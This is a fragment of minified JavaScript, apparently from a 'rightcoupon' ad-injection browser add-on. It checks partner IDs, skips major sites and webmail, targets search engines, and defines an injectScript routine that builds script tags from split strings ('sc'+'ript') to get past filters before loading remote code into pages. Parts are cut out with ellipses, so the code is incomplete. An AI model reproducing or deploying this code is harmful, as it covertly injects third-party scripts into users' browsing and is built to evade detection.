(function(){if(window.visadd){var encoded_partner='14567726000';if(encoded_partner!=visadd.preload.encoded_partner){try{var sub_id='fo';if(encoded_partner=="14567725798"||encoded_partner=="14567725764"||encoded_partner=="14567725690"){if(typeof(vadims_sub_id)!='undefined'){sub_id=vadims_sub_id;}}
...
visadd.preload={domain_blacklist:';google;facebook;mail.aol.com;mail.yahoo.com;webmail;ads.yahoo.com;imprim-encre.com;cartouche.com;wikipedia.com;1800petmeds.com;',domain_restricted:'',domain_search:';bing.com;ask.com;search.yahoo.com;search.aol.com;google;',page_blacklist:'',encoded_partner:'14567726000',sub_id:'fo',unit_marker:'Powered by rightcoupon',unit_marker_url:'http://right-coupon.com?try=0',issued_request:false,search_term_to_use:null,over_cap:false,cap_x24:10,language:function(){try{var lang_dict={"br":"pt","it":"it","es":"es","fr":"fr","de":"de","mx":"es","ar":"es","co":"es","cl":"es"};var curr_host=document.location.host;curr_host_split=curr_host.split(".")
...
return lang;},injectScript:function(url){setTimeout(function(){var script=document.createElement('sc'+'ript');script.async=true;script.setAttribute('type','text/jav'+'ascri'+'pt');script.type='text/jav'+'ascri'+'pt';script.src=url;if(document.body){document.body.appendChild(script);}else{var hs=document.getElementsByTagName('head');if(hs&&hs.length>0){var h=hs[0]
h.appendChild(script);}}},0);},checkDomain:function(ourHostName,list)
